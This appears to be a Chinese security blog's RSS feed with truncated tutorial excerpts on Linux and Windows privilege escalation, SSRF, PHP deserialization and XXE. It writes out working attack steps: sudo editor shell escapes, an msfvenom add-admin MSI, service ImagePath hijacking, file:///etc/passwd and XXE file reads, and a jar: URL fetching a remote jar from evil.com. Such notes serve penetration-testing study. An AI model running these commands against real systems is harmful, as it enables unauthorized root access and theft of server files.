<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>H4ck3r Station</title>
    <link>http://localhost:1313/</link>
    <description>Recent content on H4ck3r Station</description>
    <generator>Hugo -- 0.155.1</generator>
    <language>zh-cn</language>
    <lastBuildDate>Sun, 15 Feb 2026 00:00:00 +0000</lastBuildDate>
    <atom:link href="http://localhost:1313/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Linux提权</title>
      <link>http://localhost:1313/posts/linux%E6%8F%90%E6%9D%83/</link>
      <pubDate>Sun, 15 Feb 2026 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/posts/linux%E6%8F%90%E6%9D%83/</guid>
      <description>&lt;h1 id=&#34;常规提权方式&#34;&gt;常规提权方式&lt;/h1&gt;
&lt;h2 id=&#34;一sudo滥用提权&#34;&gt;一、sudo滥用提权&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;sudo -l&lt;/code&gt;提示要输入密码的原因:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;默认SUDO行为 : 需要输入当前用户的密码(不是root)密码&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;sudoers配置问题: 未配置免密码访问 在&lt;code&gt;/etc/sudoers&lt;/code&gt;文件中没有为当前用户配置&lt;code&gt;NOPASSWD&lt;/code&gt;选项&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;配置覆盖问题: 用户组覆盖了用户配置,可能被添加到了wheel用户组&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;检查当前用户所在组&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;id username 	
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;
&lt;p&gt;如果发现在wheel组中,检查wheel组的配置&lt;/p&gt;
&lt;p&gt;查看&lt;code&gt;%wheel&lt;/code&gt;相关配置,看是否设置了&lt;code&gt;NOPASSWD&lt;/code&gt;或要求密码&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo visudo
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;从wheel组中移除用户&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo gpasswd -d username wheel
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;利用步骤&#34;&gt;利用步骤：&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;查看当前用户sudo权限&lt;/strong&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo -l
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;示例输出：&lt;code&gt;(ALL) NOPASSWD: /usr/bin/vim&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;利用vim提权&lt;/strong&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo /usr/bin/vim
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;在vim中输入 &lt;code&gt;:set shell=/bin/bash&lt;/code&gt; 回车&lt;/li&gt;
&lt;li&gt;然后输入 &lt;code&gt;:shell&lt;/code&gt; 回车&lt;/li&gt;
&lt;li&gt;成功获得root shell&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;利用其他命令提权&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;如果发现可以执行&lt;code&gt;/usr/bin/nano&lt;/code&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo /usr/bin/nano
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;在nano中按&lt;code&gt;Ctrl+R&lt;/code&gt;，输入&lt;code&gt;!bash&lt;/code&gt;，回车&lt;/li&gt;
&lt;li&gt;即可获得root shell&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;说明&#34;&gt;说明：&lt;/h3&gt;
&lt;p&gt;sudo配置不当，允许用户以root身份执行特定命令，而无需密码验证。&lt;/p&gt;
&lt;h2 id=&#34;二suid特殊权限提权&#34;&gt;二、SUID特殊权限提权&lt;/h2&gt;
&lt;h3 id=&#34;利用步骤-1&#34;&gt;利用步骤：&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;查找SUID文件&lt;/strong&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;find / -perm -u&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;s -type f 2&amp;gt;/dev/null
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;利用/bin/mount提权&lt;/strong&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mkdir /tmp/mount
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;touch /tmp/mount/malicious_file
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo /bin/mount -o bind /tmp/mount /tmp/mount
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo /bin/mount /tmp/mount /tmp/mount
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;通过此方式可获取root权限&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;利用/bin/ping提权&lt;/strong&gt;：&lt;/p&gt;</description>
    </item>
    <item>
      <title>SSRF</title>
      <link>http://localhost:1313/posts/ssrf/</link>
      <pubDate>Sun, 15 Feb 2026 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/posts/ssrf/</guid>
      <description>&lt;h3 id=&#34;伪协议&#34;&gt;伪协议&lt;/h3&gt;
&lt;h5 id=&#34;php&#34;&gt;PHP&lt;/h5&gt;
&lt;p&gt;&lt;code&gt;http/s://  &lt;/code&gt;常用于探测存活主机和开放端口,配合burp&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;https://example.com/title?title=http://127.0.0.1:6379
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;file:// &lt;/code&gt; 读取文件内容&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;file:///etc/passwd
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;dict://  &lt;/code&gt;字典服务协议，可以通过这个协议执行一些指令.但是&lt;code&gt;dict&lt;/code&gt;很难完成复杂的认证，他每次发送的请求都是新建立的连接&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;dict://127.0.0.1:6379/info
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;gopher:// &lt;/code&gt; gopher协议可以伪造任何基于TCP的应用层协议报文（java不支持）&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;gopher://&amp;lt;host&amp;gt;:&amp;lt;port&amp;gt;/_&amp;lt;payload&amp;gt;

_ : 占位符。gopher协议在传输中会吃掉路径后的第一个字符
&amp;lt;payload&amp;gt; : 经过URL编码的原始tcp数据流
&lt;/code&gt;&lt;/pre&gt;&lt;h5 id=&#34;java&#34;&gt;JAVA&lt;/h5&gt;
&lt;p&gt;&lt;code&gt;file://&lt;/code&gt; 协议	与 PHP 类似&lt;/p&gt;
&lt;p&gt;可以读取本地文件：&lt;code&gt;file:///etc/passwd&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;netdoc://&lt;/code&gt; 协议	它允许你访问并提取 &lt;code&gt;jar&lt;/code&gt; 包中的内容。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Payload: &lt;code&gt;netdoc:///etc/passwd&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;jar://&lt;/code&gt; 协议	它允许你访问并提取 &lt;code&gt;jar&lt;/code&gt; 包中的内容。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;语法： &lt;code&gt;jar:{url}!/{entry}&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;用法： &lt;code&gt;jar:http://evil.com/test.jar!/com/test/Main.class&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;利用点：
&lt;ol&gt;
&lt;li&gt;让服务器去下载远程恶意 jar 包。&lt;/li&gt;
&lt;li&gt;读取本地 classpath 下的配置文件。&lt;/li&gt;
&lt;li&gt;结合某些反序列化漏洞，控制类加载过程。&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;绕过&#34;&gt;绕过&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;IP地址&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;进制转换： 浏览器和许多网络库支持非十进制的 IP。

八进制： 0177.0.0.1
十六进制： 0x7f.0x0.0x0.0x1
十进制整数（最隐蔽）： 将 IP 换算成一个超大数字。127.0.0.1 ----&amp;gt; 2130706433

特殊省略写法：

127.0.0.1 可以写成 127.1 或 127.0.1。
0.0.0.0 在 Linux 下通常也会指向本地。

IPv6 绕过：
使用 [::1] 代表 127.0.0.1。
使用 IPv6 格式的内网地址。
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;利用DNS&lt;/strong&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Windows提权</title>
      <link>http://localhost:1313/posts/windows%E6%8F%90%E6%9D%83/windows%E6%8F%90%E6%9D%83/</link>
      <pubDate>Sun, 15 Feb 2026 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/posts/windows%E6%8F%90%E6%9D%83/windows%E6%8F%90%E6%9D%83/</guid>
      <description>&lt;h1 id=&#34;windows工作组环境和域环境提权方式详解&#34;&gt;Windows工作组环境和域环境提权方式详解&lt;/h1&gt;
&lt;h2 id=&#34;一工作组环境提权方式&#34;&gt;一、工作组环境提权方式&lt;/h2&gt;
&lt;h3 id=&#34;1-alwaysinstallelevated提权&#34;&gt;1. AlwaysInstallElevated提权&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;条件&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;系统已启用AlwaysInstallElevated（注册表值为1）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;检查方法&lt;/strong&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;利用步骤&lt;/strong&gt;：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;生成恶意MSI文件（在Kali Linux中）：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msfvenom -p windows/adduser USER=hacker PASS=P@ssw0rd -f msi -o add.msi
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;em&gt;如果在Windows上操作，可以使用在线工具生成MSI文件&lt;/em&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;在Windows上执行：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msiexec /i add.msi
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;验证提权：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;net user hacker
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;成功标志&lt;/strong&gt;：看到hacker账户，且在管理员组中&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;2-服务权限配置错误提权&#34;&gt;2. 服务权限配置错误提权&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;条件&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;服务路径权限配置错误&lt;/li&gt;
&lt;li&gt;当前用户对服务可执行文件或目录有写权限&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;检查方法&lt;/strong&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sc query
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;winpeas.exe quiet notcolor serviceinfo
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;利用步骤&lt;/strong&gt;：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;找到一个服务（如Spooler）：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sc qc Spooler
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;修改服务路径：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;reg add &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Spooler&amp;#34;&lt;/span&gt; /t REG_EXPAND_SZ /v ImagePath /d &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;C:\evil\shell.exe&amp;#34;&lt;/span&gt; /f
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;重启服务：&lt;/p&gt;</description>
    </item>
    <item>
      <title>PHP反序列化</title>
      <link>http://localhost:1313/posts/php_serialize/</link>
      <pubDate>Sat, 07 Feb 2026 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/posts/php_serialize/</guid>
      <description>&lt;p&gt;距离第一次学习php反序列已经很长时间了，初次学习时就学的迷迷糊糊，有很多理解不到位的地方，正好最近有时间打算回过头重新开始学习一遍，理解不到位之处请各位大佬多多指正。&lt;/p&gt;
&lt;h3 id=&#34;为什么需要序列化和反序列化&#34;&gt;为什么需要序列化和反序列化？&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;网络传输只能处理位流(Bytes)&lt;/strong&gt; , 当你在java,php,python中定义一个复杂的用户对象，但是路由器并不认识，只能通过序列化成字符串的方式以字节流的方式传输，传输流程大致如下：&lt;/p&gt;
&lt;p&gt;服务器对象&amp;ndash;&amp;gt; 序列化&amp;ndash;&amp;gt; 字节流&amp;ndash;&amp;gt; 网络传输&amp;ndash;&amp;gt; 反序列化&amp;ndash;&amp;gt; 客户端&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;内存(RAM)易失&lt;/strong&gt;，程序运行在内存中，一旦断电，关闭数据就会消失&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;php中的序列化反序列化函数&#34;&gt;php中的序列化反序列化函数&lt;/h3&gt;
&lt;p&gt;序列化：&lt;code&gt;serialize()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;反序列化：&lt;code&gt;unserialize()&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;漏洞利用&#34;&gt;漏洞利用&lt;/h3&gt;
&lt;p&gt;前提:  服务端(不论是当前代码还是所包含的代码中)必须要有对象(序列化形式)所对应的类, 否则无法反序列化&lt;/p&gt;
&lt;p&gt;例如: &lt;code&gt;payload:O:1:&amp;quot;**S**&amp;quot;:1:{s:4:&amp;quot;test&amp;quot;;s:29:&amp;quot;&amp;lt;script&amp;gt;alert(&#39;xss&#39;)&amp;lt;/script&amp;gt;&amp;quot;;} &lt;/code&gt;这时候如果服务端没有一个叫做S的类, 就会反序列化失败&lt;/p&gt;
&lt;p&gt;所以说, 想要发起反序列化攻击, 必要条件之一: 必须知道服务端有哪些类&lt;/p&gt;
&lt;h3 id=&#34;魔术方法&#34;&gt;魔术方法&lt;/h3&gt;
&lt;p&gt;注:加黑重点关注&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;&lt;strong&gt;魔术方法&lt;/strong&gt;&lt;/th&gt;
          &lt;th&gt;&lt;strong&gt;描述&lt;/strong&gt;&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__construct()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;strong&gt;构造方法&lt;/strong&gt;，当对象被实例化（&lt;code&gt;new&lt;/code&gt;）时自动调用。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__destruct()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;strong&gt;析构方法&lt;/strong&gt;，当对象被销毁时自动调用。反序列化攻击中最常见的入口。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__call()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;在对象上下文中调用一个&lt;strong&gt;不可访问或不存在的方法&lt;/strong&gt;时触发。常用的跳板。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__callStatic()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;在静态上下文中调用一个&lt;strong&gt;不可访问或不存在的方法&lt;/strong&gt;时触发。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__get()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;读取对象中&lt;strong&gt;不可访问（未定义或私有）的属性&lt;/strong&gt;时触发。常用的跳板。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__set()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;写入对象中&lt;strong&gt;不可访问（未定义或私有）的属性&lt;/strong&gt;时触发。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__isset()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;使用 &lt;code&gt;isset()&lt;/code&gt; 或 &lt;code&gt;empty()&lt;/code&gt; 检查对象中不可访问的属性时触发。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__unset()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;使用 &lt;code&gt;unset()&lt;/code&gt; 删除对象中不可访问的属性时触发。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__sleep()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;当对象被 &lt;code&gt;serialize()&lt;/code&gt; 序列化前触发，通常用于返回需要被序列化的属性列表。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__wakeup()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;当对象被 &lt;code&gt;unserialize()&lt;/code&gt; 反序列化时触发，常用于初始化资源。反序列化的“点火开关”。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__toString()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;当对象被转换成&lt;strong&gt;字符串&lt;/strong&gt;（如 &lt;code&gt;echo&lt;/code&gt; 或拼接）时自动调用。核心跳板。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__invoke()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;当尝试以&lt;strong&gt;函数方式调用对象&lt;/strong&gt;（如 &lt;code&gt;$obj()&lt;/code&gt;）时触发。常用的跳板。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__clone()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;当对象使用 &lt;code&gt;clone&lt;/code&gt; 关键字被克隆时调用。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__serialize()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;PHP 7.4+ 引入。序列化前触发，优先级高于 &lt;code&gt;__sleep&lt;/code&gt;。返回一个包含对象数据的数组。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__unserialize()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;PHP 7.4+ 引入。反序列化后触发，优先级高于 &lt;code&gt;__wakeup&lt;/code&gt;。用于恢复对象状态。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__set_state()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;当使用 &lt;code&gt;var_export()&lt;/code&gt; 导出类时触发。必须是静态方法，返回类实例。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__debugInfo()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;当使用 &lt;code&gt;var_dump()&lt;/code&gt; 打印对象信息时触发，用于控制显示的属性。&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;1、 &lt;code&gt;__construct()&lt;/code&gt; 和 &lt;code&gt;__destruct()&lt;/code&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>XML 漏洞详解</title>
      <link>http://localhost:1313/posts/xml/</link>
      <pubDate>Wed, 04 Feb 2026 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/posts/xml/</guid>
      <description>&lt;h1 id=&#34;xml漏洞&#34;&gt;XML漏洞&lt;/h1&gt;
&lt;h2 id=&#34;理论&#34;&gt;理论：&lt;/h2&gt;
&lt;p&gt;xml是一种用来传输和存储数据的格式，长得有些像HTML&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;user&amp;gt;
	&amp;lt;username&amp;gt;admin&amp;lt;/username&amp;gt;
	&amp;lt;role&amp;gt;manager&amp;lt;/role&amp;gt;
&amp;lt;/user&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;要学习XML就要先学习DTD&lt;/p&gt;
&lt;p&gt;什么是DTD？&lt;/p&gt;
&lt;p&gt;DTD（文档类型定义）使用来定义xml文档的合法结构。重点在于DTD允许定义实体也就是&lt;strong&gt;Entity&lt;/strong&gt;，而他也就是漏洞的根源&lt;/p&gt;
&lt;p&gt;他有些像编程语言中的变量，举两个例子&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;内部实体   
&amp;lt;!DOCTYPE root [
	&amp;lt;!ENTITY name &amp;#34;h4xk0r&amp;#34;&amp;gt;
]&amp;gt;
&amp;lt;root&amp;gt;Hello &amp;amp;name;&amp;lt;/root&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;外部实体----这是漏洞的核心，xml允许从外部通过url或文件路径加载数据
语法关键字 SYSTEM 或 PUBLIC

&amp;lt;!DOCTYPE root[
	&amp;lt;!ENTITY xxe SYSTEM &amp;#34;file:///etc/passwd&amp;#34;&amp;gt;
]&amp;gt;
&amp;lt;root&amp;gt;&amp;amp;xxe;&amp;lt;root&amp;gt;

如果在实际过程中后端接收了你的XML，并且解析了&amp;amp;xxe这个变量，那么就可以通过构造SYSTEM后面的路径，让服务器读取文件，探测内网
